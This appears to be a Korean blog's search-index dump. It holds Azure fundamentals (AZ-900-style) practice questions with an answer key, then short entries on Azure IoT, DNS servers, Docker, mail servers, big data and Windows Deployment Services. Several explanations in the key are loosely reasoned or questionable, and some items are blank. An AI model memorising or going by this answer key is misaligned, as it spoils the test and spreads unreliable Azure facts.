암호를 변경하라는 메시지가 자동으로 표시되는지 확인해야합니다. 어떤 Azure 서비스를 사용해야합니까?   Azure AD Connect 상태\n  Azure AD ID 관리 권한\n  Azrue ATP\n  Azure AD ID Protect\n      \r문제 풀이\r...\r\r 4 ID Protect를 통해 계정보안이 관리됩니다.\n \r\r\r   회사에서 여러 웹 서버와 여러 데이터베이스 서버를 Azure에 배포 할 계획입니다. 웹 서버에서 데이터베이스 서버로의 연결 유형을 제한하려면 Azure 솔루션을 권장해야합니다. 추천에 무엇을 포함해야합니까?   NSG\n  Azure Service Bus\n  Local Network Gateway\n  route filter\n      \r문제 풀이\r...\r\r 1\n  기본적으로 NSG를 통해 IP, 포트 연결유형을 제한 할 수 있습니다.\n \r\r\r   애플리케이션은 보안 토큰을 검색하기 위해 무엇에 연결해야합니까?   Azure Storage 계정\n  Azure Active Dirctory\n  인증서 저장소\n  Azure Key Vault\n      \r문제 풀이\r...\r\r 4\nKey Vault는 보안 토큰을 관리합니다.\n \r\r\r   리소스 그룹은 여러 구독에서 Azure 리소스의 규정 준수를 관리하는 기능을 조직에 제공합니다. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택합니다. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경이 필요하지 않습니다.\n  관리 그룹\n  Azure 정책\n  Azure App Service 계획\n      \r문제 풀이\r...\r\r 3\n리소스 그룹을 관리하는 것은 Azure 정책입니다.\n \r\r\r   네트워크에 Active Directory 포리스트가 있습니다. 포리스트에는 5,000 개의 사용자 계정이 있습니다. 회사는 모든 네트워크 리소스를 Azure로 마이그레이션하고 온-프레미스 데이터 센터를 폐기 할 계획입니다. 계획된 마이그레이션 후 사용자에게 미치는 영향을 최소화하는 솔루션을 권장해야합니다. 무엇을 추천해야합니까?   Azure MFA (Multi-Factor Authentication) 구현\n  모든 Active Directory 사용자 계정을 Azure AD (Azure Active Directory)에 동기화\n  모든 사용자에게 암호를 변경하도록 지시\n  각 사용자에 대해 Azure Active Directory (Azure AD)에서 게스트 사용자 계정 만들기\n      \r문제 풀이\r...\r\r 2 Azure AD가 동일한 역할을 수행합니다.\n \r\r\r   인증서를 저장하려면 어떤 Azure 서비스를 사용해야합니까?   Azure 보안 센터\n  Azure Storage 게정\n  Azure Key Vault\n  Azure 정보 보호\n      \r문제 풀이\r...\r\r 3\n  인증서의 관리는 Azure Key Vault에서 관리됩니다.\n \r\r\r   RG1이라는 리소스 그룹이 있습니다. RG1에서 가상 네트워크 및 앱 서비스를 만들 계획입니다. RG1에서만 가상 머신 생성을 방지해야합니다. 무엇을 사용해야합니까?   lock\n  Azure 역할\n  tag\n  Azure 정책\n      \r문제 풀이\r...\r\r 4 정책을 통해 삭제를 제한할 수 있습니다.\n \r\r\r   Azure Information Protection은 무엇을 암호화 할 수 있나요?   네트워크 트래픽\n  문서 및 이메일 메시지\n  Azure Storage 계정\n  Azure SQL 데이터베이스\n      \r문제 풀이\r...\r\r 2\nAzure Information Protection은 문서 및 이메일 메시지를 관리합니다.\n \r\r\r   회사의 Azure 환경이 규정 요구 사항을 충족하는지 평가하려면 무엇을 사용해야합니까?   지식 센터 웹 사이트\n  the Advisor blade from the Azure portal\n  Compliance Manager from the Security Trust Portal\n  the Security Center blade from the Azure portal\n      \r문제 풀이\r...\r\r 4\nAzure Portal에 Azure 규정 준수사항이 있습니다.\n \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오.     \r문제 풀이\r...\r\r  \r\r\r   회사는 신용 카드 정보가 포함 된 Microsoft Word 문서에 워터 마크를 자동으로 추가하는 Azure 정책을 구현합니다. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택합니다. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경할 필요 없습니다.\n  DDoS Protection\n  Azure Iformation Protection\n  Azure AD ID Protection\n      \r문제 풀이\r...\r\r 3\nAzure Information Protection을 통해 워터마크를 자동으로 추가하는 Azure 정책을 구현할 수 있습니다.\n \r\r\r   Azure Monitor에서 지난 14 일 동안 특정 가상 머신을 끈 사용자를 볼 수 있습니다. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택합니다. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경이 필요하지 않습니다.\n  Azure Event Hubs\n  Azure 활동 로그\n  Azure 서비스 상태\n      \r문제 풀이\r...\r\r 3\nAzure 활동 로그를 통해 확인이 가능합니다.\n \r\r\r   G1이라는 리소스 그룹에 VNET1이라는 Azure 가상 네트워크가 있습니다. 가상 네트워크가 RG1에서 허용되는 리소스 유형이 아님을 지정하는 Azure 정책을 할당합니다. VNET1은 자동으로 삭제됩니다. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택합니다. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경이 필요하지 않습니다.\n  다른 리소스 그룹으로 자동 이동\n  계속 정상적으로 작동합니다.\n  읽기 전용 개체\n      \r문제 풀이\r...\r\r 1 해당 리소스는 관리가 불가능해집니다.\n \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오.     \r문제 풀이\r...\r\r 3번째 문항은 Yes입니다.\n \r\r\r   회사에 여러 지역의 리소스가 포함 된 Azure 환경이 있습니다. 회사 정책에 따르면 관리자는 사무실이 있는 국가의 지역에서만 추가 Azure 리소스를 만들 수 있어야합니다. 정책 요구 사항을 충족하는 데 사용해야하는 Azure 리소스를 만들어야합니다. 무엇을 만들어야합니까?   읽기 전용 잠금\n  Azure 정책\n  관리 그룹\n  예약\n      \r문제 풀이\r...\r\r 2\nAzure 정책을 통해 요구사항을 만족시킬 수 있습니다.\n \r\r\r   권한 부여는 사용자의 자격 증명을 확인하는 프로세스입니다. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택합니다. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경이 필요하지 않습니다.\n  인증\n  연맹\n  발권\n      \r문제 풀이\r...\r\r 2 권한 부여가 아닌 인증을 통해 자격 증명을 받습니다.\n \r\r\r   다음 요구 사항을 충족하는 Azure 솔루션을 구성해야합니다.  ✑ 공격으로부터 웹 사이트 보호\r✑ 시도 된 공격에 대한 세부 정보가 포함 된 보고서를 생성합니다.\r솔루션에 무엇을 포함해야합니까?\n  Azure 방화벽\n  NSG\n  Azure 정보 보호\n  DDoS 보호\n    \r문제 풀이\r...\r\r D 문제는 DDoS 공격에 대한 설명입니다.\n \r\r\r   Azure 환경에 대한 여러 보안 서비스를 구현할 계획입니다. 다음 보안 요구 사항을 충족하기 위해 사용해야하는 Azure 서비스를 식별해야합니다.  ✑ 센서를 사용하여 위협 모니터링\r✑ 조건에 따라 Azure MFA (Multi-Factor Authentication) 적용 각 요구 사항에 대해 어떤 Azure 서비스를 식별해야합니까? 답변하려면 답변 영역에서 적절한 옵션을 선택하십시오.\n   \r문제 풀이\r...\r\r  \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오.     \r문제 풀이\r...\r\r  \r\r\r   회사는 모든 온-프레미스 데이터를 Azure로 마이그레이션 할 계획입니다. Azure가 회사의 지역 요구 사항을 준수하는지 여부를 식별해야합니다. 무엇을 사용해야합니까?   지식 센터\n  Azure Market Place\n  Azure Potal\n  보안 센터\n      \r문제 풀이\r...\r\r 4 보안센터를 통해 확인할 수 있습니다.\n \r\r\r   Azure Key Vault는 Azure AD (Azure Active Directory) 사용자 계정에 대한 비밀을 저장하는 데 사용됩니다. 명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택합니다. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경이 필요하지 않습니다.\n  Azure AD 관리 계정\n  개인 식별 정보\n  서버 애플리케이션\n      \r문제 풀이\r...\r\r 1\nAzure Key Vault에는 Azure AD에 대한 정보를 저장합니다.\n \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오.     \r문제 풀이\r...\r\r  \r\r\r   여러 Azure 가상 머신을 배포 할 계획입니다. 인터넷의 장치가 가상 머신에 액세스하는 데 사용할 수있는 포트를 제어해야합니다. 무엇을 사용해야합니까?   NSG\n  Azure AD 역할\n  Azure AD 그룹\n  Azure Key Vault\n      \r문제 풀이\r...\r\r 1\nNSG 에서 Port를 통한 접근을 제어합니다.\n \r\r\r   Azure 구독에 여러 가상 머신이 있습니다. 새 구독을 만듭니다. 가상 머신은 새 구독으로 이동할 수 없습니다. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택합니다. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경이 필요하지 않습니다.\n  가상 머신을 새 구독으로 이동할 수 있습니다.\n  가상 머신은 모두 동일한 리소스 그룹에 있는 경우에만 새 구독으로 이동할 수 있스니다.\n  가상 머신은 Windows Server 2016을 실행하는 경우에만 새 구독으로 이동할 수 있습니다.\n      \r문제 풀이\r...\r\r 2\n구독은 수정 및 이전이 가능합니다.\n \r\r\r   Azure 환경에서 여러 관리되는 Microsoft SQL Server 인스턴스를 만들려고 시도하고 Azure 구독 제한을 늘려야한다는 메시지를받습니다. 한계를 높이려면 어떻게해야합니까?   서비스 상태 경고 만들기\n  지원 계획 업그레이드\n  Azure 정책 수정\n  새 지원 요청 생성\n      \r문제 풀이\r...\r\r 4\n요청함으로써 사용제한을 풀 수 있습니다.\n \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오     \r문제 풀이\r...\r\r  \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오.     \r문제 풀이\r...\r\r  \r\r\r   회사에는 10 개의 사무실이 있습니다. Azure Portal에서 여러 청구 보고서를 생성 할 계획입니다. 각 보고서에는 각 사무실의 Azure 리소스 용률이 포함됩니다. 보고서를 생성하기 전에 어떤 Azure Resource Manager 기능을 사용해야합니까?   태그\n  탬플릿\n  lock\n  정책\n      \r문제 풀이\r...\r\r 1\n태그를 통해 분류가 가능합니다.\n \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오.     \r문제 풀이\r...\r\r  \r\r\r   Azure 리소스를 배포합니다. 서비스 중단으로 인해 리소스를 장기간 사용할 수 없게됩니다. Microsoft는 자동으로 귀하의 은행 계좌를 환불 해드립니다. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택합니다. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경할 필요가 없습니다.\n  리소스를 다른 구독으로 자동 마이그레이션\n  자동으로 계정에 입금\n  Azure 크레딧으로 교환 할 수 있는 쿠폰 코드를 전송\n      \r문제 풀이\r...\r\r 3 자동으로 크레딧으로 변환됩니다.\n \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오.     \r문제 풀이\r...\r\r  \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오.     \r문제 풀이\r...\r\r  \r\r\r   회사에서 Azure로 마이그레이션 할 계획입니다. 회사에는 여러 부서가 있습니다. 각 부서에서 사용하는 모든 Azure 리소스는 부서 관리자가 관리합니다. 부서에 대해 Azure를 분할하는 기능을 제공하는 Azure 배포를 권장해야합니다. 솔루션은 관리 노력을 최소화해야합니다. 추천에 무엇을 포함해야합니까?   여러 구독\n  여러 Azure AD 디렉터리\n  여러 지역\n  여러 리소스 그룹\n      \r문제 풀이\r...\r\r 문제풀이\n \r\r\r   회사에 사용되지 않는 다음 리소스가 포함 된 Azure 구독이 있습니다  ✑ Azure Active Directory (Azure AD)의 사용자 계정 20 개 ✑ Azure AD의 그룹 5 개\r✑ 공용 IP 주소 10 개 ✑ 네트워크 인터페이스 10 개\r회사의 Azure 비용을 줄여야합니다. 해결 방법 : 사용하지 않는 네트워크 인터페이스를 제거합니다. 이것이 목표를 충족합니까?\n  Yes\n  No\n    \r문제 풀이\r...\r\r 2\n네트워크 인터페이스는 비용이 지불되지 않습니다.\n \r\r\r   회사에 사용되지 않는 다음 리소스가 포함 된 Azure 구독이 있습니다  ✑ Azure Active Directory (Azure AD)의 사용자 계정 20 개 ✑ Azure AD의 그룹 5 개\r✑ 공용 IP 주소 10 개 ✑ 네트워크 인터페이스 10 개\r회사의 Azure 비용을 줄여야합니다. 해결 방법 : 사용하지 않는 사용자 계정을 제거합니다. 이것이 목표를 충족합니까?\n  Yes\n  No\n    \r문제 풀이\r...\r\r 2\n  구독은 비용과 연관이 없습니다.\n \r\r\r   월간 가동률을 어떻게 계산해야합니까? 답변하려면 답변 영역에서 적절한 옵션을 선택하십시오.     \r문제 풀이\r...\r\r  \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오.     \r문제 풀이\r...\r\r  \r\r\r   가능한 가장 낮은 비용으로 모범 사례 정보, 건강 상태 및 알림, 청구 정보에 대한 연중 무휴 액세스를 제공하는 지원 계획 솔루션은 표준 지원 계획입니다. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택합니다. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경이 필요하지 않습니다.\n  Developer\n  Basic\n  Premier\n      \r문제 풀이\r...\r\r 3\n  24시간 및 사례 정보 등의 기본 솔루션을 제공하는 것은 Basic입니다.\n \r\r\r   여러 Azure 가상 머신을 배포 할 계획입니다. 단일 데이터 센터가 실패하는 경우 가상 머신에서 실행중인 서비스를 사용할 수 있는지 확인해야합니다. 솔루션 : 가상 머신을 둘 이상의 리소스 그룹에 배포합니다. 이것이 목표를 충족합니까?   Yes\n  No\n      \r문제 풀이\r...\r\r 2\n  리소스 그룹이 아닌 가용영역에 배포해야합니다.\n \r\r\r   어떤 Azure 지원 플랜에서 새 지원 요청을 열 수 있나요?   Premier 및 Professional Direct 전용\n  Premier, Professional Direct 및 Standard 전용\n  Premier, Professional Direct, Standard 및 Developer 전용\n  Premier, Professional Direct, Standard, Developer 및 Basic\n      \r문제 풀이\r...\r\r 4\n기술지원은 Basic은 지원하지 않지만 지원 요청은 모두 가능합니다.\n \r\r\r   support.microsoft.com에서 Azure 지원 요청을 만들 수 있습니다. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택하십시오. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경할 필요가 없습니다.\n  Auzre Portal\n  지식 센터\n  보안 및 규정 준수 관리 센터\n      \r문제 풀이\r...\r\r 2 Azure Portal에서 지원 요청이 가능합니다.\n \r\r\r   Azure 서비스 수준 계약 (SLA)에서 보장되는 것은 무엇인가요?   가동 시간\n  가용성\n  대역폭\n  성능\n      \r문제 풀이\r...\r\r 2\nSLA에서 보장하는 것은 가용성입니다.\n \r\r\r   Azure 서비스는 공개 미리보기 상태 일 때 모든 Azure 고객이 사용할 수 있습니다. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택합니다. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경할 필요 없습니다.\n  비공개 미리보기\n  개발\n  EA (기업 계약) 구독\n      \r문제 풀이\r...\r\r 1 공개 미리보기는 모두 사용하고 있고, 비공개는 특정 고객만 사용이 가능합니다.\n \r\r\r   회사의 지원 정책에 따르면 Azure 환경은 전화 또는 이메일로 지원 엔지니어에 액세스 할 수있는 옵션을 제공해야합니다. 지원 정책 요구 사항을 충족하는 지원 계획을 추천해야합니다. 솔루션 : 기본 지원 계획을 권장합니다. 이것이 목표를 충족합니까?   Yes\n  No\n      \r문제 풀이\r...\r\r 2\n기본 지원 계획에는 기술지원이 존재하지 않습니다.\n \r\r\r   회사에서 Azure를 구매할 계획입니다. 회사의 지원 정책에 따르면 Azure 환경은 전화 또는 이메일로 지원 엔지니어에 액세스 할 수있는 옵션을 제공해야합니다. 지원 정책 요구 사항을 충족하는 지원 계획을 추천해야합니다. 솔루션 : 표준 지원 계획을 권장합니다. 이것이 목표를 충족합니까?   Yes\n  No\n      \r문제 풀이\r...\r\r A\n \r\r\r   회사에서 Azure를 구매할 계획입니다. 회사의 지원 정책에 따르면 Azure 환경은 전화 또는 이메일로 지원 엔지니어에 액세스 할 수있는 옵션을 제공해야합니다. 지원 정책 요구 사항을 충족하는 지원 계획을 추천해야합니다. 솔루션 : 표준 지원 계획을 권장합니다. 이것이 목표를 충족합니까?   Yes\n  No\n      \r문제 풀이\r...\r\r A\n \r\r\r   귀사는 Microsoft에 Azure 환경의 아키텍처 검토를 요청할 계획입니다. 회사는 현재 기본 지원 계획을 가지고 있습니다. 회사에 대한 새로운 지원 계획을 추천해야합니다. 솔루션은 비용을 최소화해야합니다. 어떤 지원 계획을 추천해야합니까?   Premier\n  Developer\n  Professional Direct\n  Standard\n      \r문제 풀이\r...\r\r 1\n아키텍처의 검토를 위해서는 프리미어가 지원 플랜이 필요합니다.\n \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오     \r문제 풀이\r...\r\r  \r\r\r   Azure Cost Management를 사용하려면 무엇이 필요합니까?   개발/ 테스트 구독\n  소프트웨어 보증\n  EA\n  종량제 구독\n      \r문제 풀이\r...\r\r 3\nEA를 통해 비용관리가 가능합니다.\n \r\r\r   Azure 평가판 계정이 지난주에 만료되었습니다. 이제 추가 Azure AD (Azure Active Directory) 사용자 계정을 만들 수 없습니다. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택합니다. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경이 필요하지 않습니다.\n  기존 Azure 가상 머신 시작\n  Azure에 저장된 데이터에 엑세스\n  Azure Portal 엑세스\n      \r문제 풀이\r...\r\r 3\n가장 맞는 말이 C입니다.\n \r\r\r   회사에는 10 개의 부서가 있습니다. 이 회사는 Azure 환경을 구현할 계획입니다. 각 부서가 사용하는 Azure 서비스에 대해 서로 다른 결제 옵션을 사용할 수 있는지 확인해야합니다. 부서별로 무엇을 만들어야합니까?   예약\n  구독\n  리소스 그룹\n  컨테이너 인스턴스\n      \r문제 풀이\r...\r\r 2\n구독을 통해 서로 다른 결제 옵션을 설정할 수 있습니다.\n \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오.     \r문제 풀이\r...\r\r  \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오.     \r문제 풀이\r...\r\r  \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오.     \r문제 풀이\r...\r\r  \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오.     \r문제 풀이\r...\r\r  \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오.     \r문제 풀이\r...\r\r  \r\r\r   Azure에서 IaaS (Infrastructure as a Service) 리소스를 프로비저닝 할 계획입니다. IaaS의 예는 어떤 리소스입니까?   Azure Web, APP\n  Azure VM\n  Azure logic APP\n  Azure SQL Database\n      \r문제 풀이\r...\r\r 2\nIaaS에 포함되는 서비스는 VM 입니다.\n \r\r\r   회사의 개발자 팀은 매주 50 개의 가상 머신을 배포 한 다음 제거 할 계획입니다. 모든 가상 머신은 Azure Resource Manager 템플릿 을 사용하여 구성됩니다. 가상 머신을 배포하고 제거하는 데 필요한 관리 노력을 최소화 할 Azure 서비스를 권장해야합니다. 무엇을 추천해야합니까?   Azure VM\n  Azure DevTest Labs\n  Azure 가상머신 확장 집합\n  Microsoft 관리 데스크톱\n      \r문제 풀이\r...\r\r 2\nDevTest Labs를 사용해야합니다.\n \r\r\r   Subscription1이라는 Azure 구독이 있습니다. Azure Portal에 로그인하고 RG1이라는 리소스 그룹을 만듭니다. Azure 설명서에서 VM1이라는 가상 머신을 만드는 다음 명령이 있습니다. az vm create \u0026ndash;resource-group RG1 \u0026ndash;name VM1-이미지 UbuntuLTS \u0026ndash;generate-ssh-keys- 명령을 사용하여 Subscription1에 VM1을 만들어야합니다. 솔루션 : Azure Portal에서 Azure Cloud Shell을 시작하고 PowerShell을 선택합니다. Cloud Shell에서 명령어를 실행합니다. 이것이 목표를 충족합니까?   Yes\n  No\n      \r문제 풀이\r...\r\r 1\nPowerShell 에서도 Azure CLI 명령어를 사용할 수 있습니다.\n \r\r\r   Microsoft가 후속 서비스가 없는 Azure 서비스에 대한 지원을 종료 할 계획 인 경우 Microsoft는 최소 12 개월 전에 알림을 제공합니다. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택합니다. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오. 1. 변경할 필요가 없습니다.   2. **6 개월**\r3. **90 일**\r4. **30 일**\r   \r문제 풀이\r...\r\r 1\n \r\r\r   회사에서 여러 사용자 지정 응용 프로그램을 Azure에 배포 할 계획입니다. 이 응용 프로그램은 회사의 고객에게 송장 서비스를 제공합니다. 각 응용 프로그램에는 몇 가지 필수 응용 프로그램 및 서비스가 설치됩니다. 모든 애플리케이션에 클라우드 배포 솔루션을 권장해야합니다. 무엇을 추천해야합니까?   SaaS\n  PaaS\n  IaaS\n      \r문제 풀이\r...\r\r 3\n \r\r\r   Azure에서 서버리스 컴퓨팅을 제공하는 서비스는 무엇입니까?   Azure Vm\n  Azure Function\n  Azure Storage account\n  Azure Container Instacne\n      \r문제 풀이\r...\r\r 2\n \r\r\r   코드를 관리하기위한 버전 제어 도구 집합을 제공하는 Azure 서비스는 무엇인가요?   Azure Repos\n  Azure DevTest Labs\n  Azure Storage\n  Azure Cosmos DB\n      \r문제 풀이\r...\r\r 1\n \r\r\r   여러 Azure 구독 및 가상 네트워크에서 네트워크 트래픽 필터링을 제공하는 서비스는 무엇입니까?   Azure 방화벽\n  애플리케이션 보안 그룹\n  Azure DDos 보호\n  NSG\n      \r문제 풀이\r...\r\r 1\n \r\r\r   Azure Cloud Shell에서 ISO 27001과 같은 회사의 규제 표준 및 규정을 추적 할 수 있습니다. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택하십시오. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경할 필요가 없습니다.\n  Microsoft 클라우드 파트너 포털\n  준수 관리자\n  보안 센터\n      \r문제 풀이\r...\r\r 문제풀이\n \r\r\r   Microsoft 온라인 서비스 개인 정보 보호 정책은 Microsoft가 처리하는 데이터, Microsoft가 데이터를 처리하는 방법 및 데이터 처리 목적을 설명합니다. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택하십시오. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경할 필요가 없습니다.\n  Microsoft 온라인 서비스 약관\n  Microsoft 온라인 서비스 수준 계약\n  Microsoft Azure에 대한 온라인 구독 계약\n      \r문제 풀이\r...\r\r 1\n \r\r\r   회사에서 Azure로 마이그레이션 할 계획입니다. 회사에는 여러 부서가 있습니다. 각 부서에서 사용하는 모든 Azure 리소스는 부서 관리자가 관리합니다. 부서를 위해 Azure를 분할 할 수있는 두 가지 가능한 기술은 무엇입니까? 각 정답은 완전한 해결책을 제시합니다.   여러 구독\n  여러 Azure AD 디렉터리\n  여러 지역\n  여러 리소스 그룹\n      \r문제 풀이\r...\r\r 1, 4\n \r\r\r   다음 중 Azure 서비스에 대한 최신 수명주기 정책을 정확하게 설명하는 문은 무엇입니까?   Microsoft는 5년 동안 서비스에 대한 일반 지원을 제공합니다.\n  Microsoft는 서비스 지원을 종료하기 전에 최소 12개월전에 통지합니다.\n  서비스가 이반 공급 된 후 Microsoft는 최소 4년 동안 서비스에 대한 지원을 제공합니다.\n  서비스가 만료되면 최대 5년까지 서비스에 대한 연장 지원을 구매할 수 있습니다.\n      \r문제 풀이\r...\r\r 2\n \r\r\r   Azure 구독에 대한 현재 청구 기간의 비용이 지정된 제한을 초과 할 때 Azure에서 Advisor 권장 사항을 사용하여 이메일 경고를 보낼 수 있습니다. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택하십시오. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경할 필요가 없습니다.\n  IAM\n  예산 알림\n  규정 준수\n      \r문제 풀이\r...\r\r 3\n \r\r\r   Azure Standard 지원 플랜은 전화로 지원 엔지니어에게 연중 무휴 24 시간 액세스 할 수있는 가장 저렴한 옵션입니다. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택합니다. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경이 필요하지 않습니다.\n  개발자\n  Basic\n  프로페셔널\n      "}),a.add({id:177,href:'/docs/azure/microsoftazure/azure05/',title:"Azure IoT",content:"Azure IoT    Azure에서 IoT를 위한 엔드투엔드 솔루션을 지원하고 구동할 수 있는 여러 서비스가 있습니다.     IoT Central   대규모 IoT 자산의 연결, 모니터링 및 관리를 도와주는, 완전히 관리되는 글로벌 IoT SaaS(Software-as-a-Service) 솔루션     Azure IoT Hub   수백만 개의 IoT 디바이스 간의 안전한 통신 및 모니터링을 제공하는 메시징 허브     IoT Edge   데이터 분석 모델을 IoT 디바이스로 직접 푸시하여 클라우드 기반 AI 모델을 참조할 필요 없이 상태 변경에 신속하게 대응할 수 있습니다.    "}),a.add({id:178,href:'/docs/system/window/window15/',title:"DNS Server",content:"DNS Server   DNS Server의 정의    DNS 서버란 Domain Name System으로 읽기 힘든 IP(192.168.10.123)을 사람이 읽기 쉽게 이름(www.xxx.xxx)으로 바꾸어주는 역할을 수행하는 기술입니다.\n  hosts 파일을 이용하여 네트워크를 접속할 수 있으며, 기하급수적으로 늘어나는 네트워크 상의 컴퓨터에 대한 모든 IP 정보를 파일 하나에 기록하는 것이 무리이기 때문에 전문적으로 해석해주는 서버 컴퓨터가 필요해졌습니다.\n     DNS Server 실습    FIRST 서버에서 cmd 창을 실행 후 nslookup을 입력합니다.\n  nslookup은 현재 할당되어있는 DNS서버를 확인할 수 있습니다.\n  DNS에 대한 설정은 네트워크 인터페이스에 설정에 있습니다.\n  C:\\Windows\\System32\\drivers\\etc\\hosts에서 정적으로 호스트를 지정할 수 있습니다.\n       DNS Server 설치를 위해 FIRST 서버에서 서버 관리자 \u0026gt; 관리 \u0026gt; 역할 및 기능 추가 \u0026gt; DNS Server 설치를 진행합니다.         설정이 완료되면 WINCLIENT에서 기본 DNS 서버를 FIRST로 변경합니다.\n  변경 후에도 인터넷 접속이 잘 되는 것을 확인하실 수 있습니다.\n      "}),a.add({id:179,href:'/docs/docker/docker/dockertraining/',title:"Docker Training",content:"  Docker Training   작성 중\n  작성 중\n       Docker docs   Docker란?\n  Docker 환경 구축\n  Docker 이미지와 컨테이너\n  Docker 기본 명령어\n  Dockerfile\n  Docker Compose\n  Docker Swarm\n      "}),a.add({id:180,href:'/docs/infra/',title:"Infra engineer",content:""}),a.add({id:181,href:'/docs/system/window/window15-2/',title:"Mail Server",content:"Mail Server   E-Mail 작동 개념    SMTP(Simple Mail Transfer Protocol)을 사용하여 클라이언트가 메일을 보내거나, 메일 서버끼리 메일을 주고 받습니다.\n  POP3(Post Office Protocol)을 사용하여 메일 서버에 도착되어 있는 메일을 클라이언트로 가져옵니다.\n  IMAP(Internet Mail Access Protocol)은 POP3와 동일합니다.\n     Mail Server 실습                                                                                                     "}),a.add({id:182,href:'/docs/azure/microsoftazure/azure06/',title:"Azure BigData",content:"Azure BigData    Microsoft Azure는 빅 데이터 및 분석 솔루션을 제공하기 위해 광범위한 기술 및 서비스를 지원합니다.     Azure Synapse Analytics   MPP(대규모 병렬 처리)를 활용하여 페타바이트 단위의 데이터에서 복잡한 쿼리를 빠르게 실행하는 클라우드 기반 EDW(Enterprise Data Warehouse)를 사용하여 대규모로 분석 실행     Azure HDInsight   클라우드의 관리형 Hadoop 클러스터를 사용하여 대량의 데이터 처리     Azure Databricks   Azure의 다른 빅 데이터 서비스와 통합할 수 있는 Apache Spark 기반의 공동 작업용 분석 서비스입니다.    "}),a.add({id:183,href:'/docs/system/window/window16/',title:"WDS",content:"Windows 배포 서비스   WDS(Windows Deployment Services)의 정의   WDS를 구성하면 사내 네트워크 안의 컴퓨터에서 Windows를 설치할 때 DVD 매체 없이도 자동 부팅 및 설치를 진행할 수 있습니다.     WDS로 구성할 수 있는 내용\n  설치할 컴퓨터의 디스크 분할 및 포맷\n  운영체제 설치 및 구성\n  설치의 단순화\n  회사 전체에 통일되고 일관적인 작업 환경을 제공\n       WDS의 장점\n  효율적인 자동 설치를 통한 비용 감소 및 시간 절약\n  네트워크 기반으로 하는 운영체제 설치\n  Windows 이미지를 클라이언트 컴퓨터에 배포\n       WDS 실습   WDS 서비스 설치를 위해 서버 매니저 \u0026gt; 관리 \u0026gt; 역할 및 기능 추가 마법사 \u0026gt; Windos Deployment Services를 추가합니다.       설치가 완료되면 도구 \u0026gt; Windows 배포 